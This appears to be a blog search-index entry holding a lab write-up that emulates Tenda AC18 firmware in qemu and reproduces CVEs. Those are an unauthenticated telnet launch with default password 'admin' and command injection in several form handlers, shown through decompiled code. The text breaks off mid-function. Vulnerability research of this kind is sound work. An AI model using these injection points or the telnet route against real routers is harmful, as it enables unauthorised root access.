<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Tenda AC18 AC1900 Router</title>
      <link href="/2022/08/05/Tenda-AC18-AC1900-Router/"/>
      <url>/2022/08/05/Tenda-AC18-AC1900-Router/</url>
      
        <content type="html"><![CDATA[<p><strong>Objectives:</strong></p><p>Reverse engineering the firmware of Tenda AC18 AC1900 Smart Dual-Band Gigabit WiFi Router and reproduce some CVE vulnerabilities in the firmware. </p><h2 id="Environment-Set-up"><a href="#Environment-Set-up" class="headerlink" title="Environment Set up"></a>Environment Set up</h2><h3 id="Retrieve-Firmware"><a href="#Retrieve-Firmware" class="headerlink" title="Retrieve Firmware"></a>Retrieve Firmware</h3><p>Download <a href="https://www.tendacn.com/us/download/detail-3852.html">router firmware</a> from Tenda’s official English website. </p><p>Version number: V15.03.3.10_EN<br>Update Date: 2021&#x2F;2&#x2F;5</p><p>Extract firmware from <code>.rar</code> package, then unpack the firmware with binwalk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me AC18.bin</span><br></pre></td></tr></table></figure><p>Go through the directory generated by binwalk, there exists a directory named <code>squashfs-root</code>, which is the file system of the router. </p><h3 id="qemu-User-Mode-Emulation"><a href="#qemu-User-Mode-Emulation" class="headerlink" title="qemu User-Mode Emulation"></a>qemu User-Mode Emulation</h3><p><strong>Network configuration</strong></p><p>The router’s <code>httpd</code> binary will check the IP address on <code>br0</code> device and listen on this IP to receive http request from the user. We have to make a virtual network bridge <code>br0</code> for it.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth0 is the current network card</span></span><br><span class="line">sudo apt-get install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 eth0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br></pre></td></tr></table></figure><p><strong>qemu setup</strong></p><p>Install <code>qemu-user-satic</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure><p>After installation, copy it to the directory under <code>squashfs-root</code>, then launch the httpd service. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-arm-static) ./qemu</span><br><span class="line"><span class="comment"># without gdb debugging</span></span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu ./bin/httpd</span><br><span class="line"><span class="comment"># with gdb debugging on port 1234</span></span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><h3 id="qemu-System-Mode-Emulation"><a href="#qemu-System-Mode-Emulation" class="headerlink" title="qemu System-Mode Emulation"></a>qemu System-Mode Emulation</h3><p><strong>Network configuration</strong><br>Similar to the network configuration in user mode, after setup the network bridge <code>br0</code>, we need to create a device called <code>tap</code> which is used as an interface to connect to network bridge <code>br0</code>. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tap0    &lt;--br0 bridge--&gt;   eth0    ----&gt;    Internet</span><br></pre></td></tr></table></figure><p>Here is the configuration script from the <a href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">reference_1</a> and <a href="https://www.anquanke.com/post/id/231445#h2-3">reference_2</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setup bridge</span></span><br><span class="line">sudo ifconfig eth0 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 eth0</span><br><span class="line">sudo brctl stp br0 on</span><br><span class="line">sudo brctl setfd br0 2</span><br><span class="line">sudo brctl sethello br0 1</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig eth0 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo dhclient eth0</span><br><span class="line">sudo brctl show br0</span><br><span class="line">sudo brctl showstp br0</span><br><span class="line"></span><br><span class="line"><span class="comment"># set up tun/tap</span></span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig tap0 10.0.4.100/24 up</span><br><span class="line">sudo ifconfig tap0 netmask 255.255.252.0</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p><strong>Attention:</strong> Make sure your <code>eth0, br0, tap0</code> are all in the same network segment as shown below (<code>eth0</code> and <code>br0</code> may or may not have the same IP address):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.15  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::5054:ff:fe69:5308  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 52:54:00:69:53:08  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 10605  bytes 2776827 (2.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 10598  bytes 2024056 (2.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.15  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::5054:ff:fe69:5308  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 52:54:00:69:53:08  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 5808990  bytes 1143337092 (1.1 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5506112  bytes 906286000 (906.2 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 492973  bytes 46099384 (46.0 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 492973  bytes 46099384 (46.0 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.4.100  netmask 255.255.252.0  broadcast 10.0.7.255</span><br><span class="line">        inet6 fe80::e008:89ff:fe7f:3e70  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether e2:08:89:7f:3e:70  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 33  bytes 7594 (7.5 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1184  bytes 62110 (62.1 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p><strong>qemu setup</strong></p><p>Then we may start up the qemu system as our wish. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>After launch the qemu system emulation, don’t forget to set up IP address in the virtual machine also in the same network segment.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 10.0.4.76/24 up</span><br></pre></td></tr></table></figure><p><strong>post setup</strong></p><p>After setting up all network configurations, now is time to think about how to run the router firmware in the qemu system.</p><p>We may first download gdbserver from <a href="https://github.com/b0ldfrev/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver">github</a>if we would like to debug in the router. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># host machine</span></span><br><span class="line">tar -zcvf ./squashfs-root.tar.gz ./squashfs-root/</span><br><span class="line"></span><br><span class="line"><span class="comment"># virtual machine</span></span><br><span class="line">tar xzf squashfs-root.tar.gz &amp;&amp; <span class="built_in">rm</span> squashfs-root.tar.gz</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev /root/squashfs-root/dev</span><br><span class="line">mount -t proc /proc /root/squashfs-root/proc</span><br><span class="line"><span class="built_in">chroot</span> /root/squashfs-root sh</span><br><span class="line"></span><br><span class="line">brctl addbr br0    </span><br><span class="line">ifconfig br0 10.0.4.76/24 up</span><br></pre></td></tr></table></figure><h3 id="Patch-Executable-File"><a href="#Patch-Executable-File" class="headerlink" title="Patch Executable File"></a>Patch Executable File</h3><p>After launching the vulnerable service in <code>/bin/httpd</code>, we may see that it gets stuck after printing some welcome message. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Yes:</span><br><span class="line"></span><br><span class="line">      ****** WeLoveLinux****** </span><br><span class="line">      </span><br><span class="line">Welcome to ...</span><br></pre></td></tr></table></figure><p>Search the string in IDA and locate at the function <code>sub_2DD04</code> (I rename it to <code>main</code> because it is the only function gets called in <code>_start</code> and <code>__uClibc_main</code>). qemu’s virtual network environment unable to pass the network check presented in the firmware (if failed, sleep forever), so we can just patch it to bypass. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// original</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;</span>);</span><br><span class="line">  init_sig_handler();</span><br><span class="line">  <span class="keyword">while</span> (check_network((<span class="type">int</span>)v19) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// sleep forever</span></span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> (ConnectCfm(v4)) &#123;</span><br><span class="line">    <span class="comment">// continue</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// fail</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// patched</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ...&quot;</span>);</span><br><span class="line">  init_sig_handler();</span><br><span class="line">  check_network((<span class="type">int</span>)v19);                      <span class="comment">// patched, to bypass the checks</span></span><br><span class="line">  v4 = sleep(<span class="number">1u</span>);</span><br><span class="line">  ConnectCfm(v4);                               <span class="comment">// patched, to bypass the checks</span></span><br><span class="line">  <span class="comment">// continue</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>Assembly:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">loc_2DDE8</span><br><span class="line">SUB             R3, R11, #-var_B4</span><br><span class="line">MOV             R0, R3</span><br><span class="line">BL              check_network</span><br><span class="line">MOV             R3, #1  ; Keypatch modified this from:</span><br><span class="line">                        ;   MOV R3, R0</span><br><span class="line">CMP             R3, #0</span><br><span class="line">BGT             loc_2DE0C</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">loc_2DE0C               ; seconds</span><br><span class="line">MOV             R0, #1</span><br><span class="line">BL              sleep</span><br><span class="line">BL              ConnectCfm</span><br><span class="line">MOV             R3, #1  ; Keypatch modified this from:</span><br><span class="line">                        ;   MOV R3, R0</span><br><span class="line">CMP             R3, #0</span><br><span class="line">BNE             loc_2DE3C</span><br></pre></td></tr></table></figure><p>After patching the vulnerable executable file, we are still unable to access the web content because the <code>/webroot/</code> directory is empty. We have to migrate <code>/webroot_ro/</code> to <code>/webroot/</code>. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /webroot_ro/* /webroot/</span><br></pre></td></tr></table></figure><p>Finally, we are good to go. </p><h2 id="Weak-Password"><a href="#Weak-Password" class="headerlink" title="Weak Password"></a>Weak Password</h2><h3 id="CVE-2018-5768-amp-CVE-2018-5770"><a href="#CVE-2018-5768-amp-CVE-2018-5770" class="headerlink" title="CVE-2018-5768 &amp; CVE-2018-5770"></a>CVE-2018-5768 &amp; CVE-2018-5770</h3><p><a href="https://www.cvedetails.com/cve/CVE-2018-5770/">CVE-2018-5770</a> is an issue discovered on Tenda AC15, however, the service provider didn’t fix it in the firmware of AC18 devices 3 years after CVE disclosure. </p><p>This vulnerability allows unauthenticated attackers to launch telnet service and connect it with the default password (addressed in <a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2018-5768">CVE-2018-5768</a>) result owning root privilege of the router. </p><p>In function <code>sub_41290</code>, we have a registering of handlers for different URLs to start different services, and one of them is telnet:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LDR             R3, =(aTelnet - 0xE4560) ; &quot;telnet&quot;</span><br><span class="line">ADD             R3, R4, R3 ; &quot;telnet&quot;</span><br><span class="line">MOV             R0, R3</span><br><span class="line">LDR             R3, =(TendaTelnet_ptr - 0xE4560)</span><br><span class="line">LDR             R3, [R4,R3] ; TendaTelnet</span><br><span class="line">MOV             R1, R3</span><br><span class="line">BL              sub_16AB4</span><br></pre></td></tr></table></figure><p>Go deep inside the <code>TendaTelnet</code> function, it will kill the existed one and relaunch a new telnet service. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall TendaTelnet(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[32]; // [sp+10h] [bp-12Ch] BYREF</span><br><span class="line">  char s[268]; // [sp+30h] [bp-10Ch] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, 0x100u);</span><br><span class="line">  memset(v3, 0, sizeof(v3));</span><br><span class="line">  GetValue(&quot;lan.ip&quot;, v3);</span><br><span class="line">  system(&quot;killall -9 telnetd&quot;);</span><br><span class="line">  doSystemCmd(&quot;telnetd -b %s &amp;&quot;, v3);</span><br><span class="line">  sprintf(s, &quot;op=%d,wl_rate=%d,index=1&quot;, 14, 24);</span><br><span class="line">  send_msg_to_netctrl(19, s);</span><br><span class="line">  sub_2BCF0(a1, &quot;load telnetd success.&quot;);</span><br><span class="line">  return sub_2C238(a1, 200);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <code>R7WebsSecurityHandler</code>, we then have the code that handles parsing requests. Which only needs a simple password <code>admin</code> (after base-64 decode) to log in. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">strncmp</span>(s1, <span class="string">&quot;/goform/telnet&quot;</span>, <span class="number">0xE</span>u) </span><br><span class="line">|| g_Pass[<span class="number">0</span>] &amp;&amp; <span class="built_in">strcmp</span>(g_Pass, <span class="string">&quot;YWRtaW4=&quot;</span>))</span><br></pre></td></tr></table></figure><p>Therefore, we are able to successfully login to the telnet service of the router and gain root privileges</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="CVE-2018-16334"><a href="#CVE-2018-16334" class="headerlink" title="CVE-2018-16334"></a>CVE-2018-16334</h3><p>Similar to <a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2020-10987">CVE-2020-10987</a>, this function can definitely execute the command as the attacker wish once they get the username and password in the router. </p><p>After some search, this vulnerability was also assigned a CVE number <a href="https://www.cvedetails.com/cve/CVE-2018-16334/">CVE-2018-16334</a>. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">formWriteFacMac</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *user_input; <span class="comment">// [sp+14h] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  user_input = (<span class="type">const</span> <span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;mac&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;00:01:02:11:22:33&quot;</span>);</span><br><span class="line">  sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;modify mac only.&quot;</span>);</span><br><span class="line">  doSystemCmd(<span class="string">&quot;cfm mac %s&quot;</span>, user_input);</span><br><span class="line">  <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>From the pseudo-code above we can clearly see the logic that it takes the user input and then concatenate it to the command. We can construct payload as below. </p><p><a data-fancybox="gallery" data-src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png" data-caption="WriteFacMac_payload"><img src="/2022/08/05/Tenda-AC18-AC1900-Router/assets/WriteFacMac_payload.png" alt="WriteFacMac_payload"></a></p><p>In the qemu-system emulation, we have:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: asjdfo: not found</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-15916"><a href="#CVE-2020-15916" class="headerlink" title="CVE-2020-15916"></a>CVE-2020-15916</h3><p>This function is mentioned in <a href="https://www.cvedetails.com/cve/CVE-2020-15916/">CVE-2020-15916</a>, which directly receives parameters from <code>lan.ip</code> and injects it into the command line argument. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">TendaTelnet</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">32</span>]; <span class="comment">// [sp+10h] [bp-12Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">268</span>]; <span class="comment">// [sp+30h] [bp-10Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  GetValue(<span class="string">&quot;lan.ip&quot;</span>, v3);</span><br><span class="line">  system(<span class="string">&quot;killall -9 telnetd&quot;</span>);</span><br><span class="line">  doSystemCmd(<span class="string">&quot;telnetd -b %s &amp;&quot;</span>, v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;op=%d,wl_rate=%d,index=1&quot;</span>, <span class="number">14</span>, <span class="number">24</span>);</span><br><span class="line">  send_msg_to_netctrl(<span class="number">19</span>, s);</span><br><span class="line">  sub_2BCF0(a1, <span class="string">&quot;load telnetd success.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_2C238(a1, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CVE-2022-28557"><a href="#CVE-2022-28557" class="headerlink" title="CVE-2022-28557"></a>CVE-2022-28557</h3><p>Similar to <a href="#cve-2018-16334">CVE-2018-16334</a>, we can also exploit <code>formSetSambaConf</code> function to achieve command execution. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">formSetSambaConf</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+10h] [bp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [sp+50h] [bp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [sp+54h] [bp-28h]</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [sp+58h] [bp-24h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [sp+5Ch] [bp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [sp+60h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// [sp+64h] [bp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// [sp+68h] [bp-14h]</span></span><br><span class="line">  <span class="type">void</span> *user_input; <span class="comment">// [sp+6Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  user_input = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;password&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">  v11 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;premitEn&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  v10 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;internetPort&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;21&quot;</span>);</span><br><span class="line">  s1 = (<span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;action&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;usbName&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v7 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestpwd&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v6 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestuser&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  v5 = get_user_input((<span class="type">int</span>)a1, (<span class="type">int</span>)<span class="string">&quot;guestaccess&quot;</span>, (<span class="type">int</span>)&amp;unk_D8B9C);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;del&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    doSystemCmd(<span class="string">&quot;/usr/sbin/usb umount %s&quot;</span>, v8);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span class="string">&quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span>);</span><br><span class="line">    sub_2BCF0((<span class="type">int</span>)a1, <span 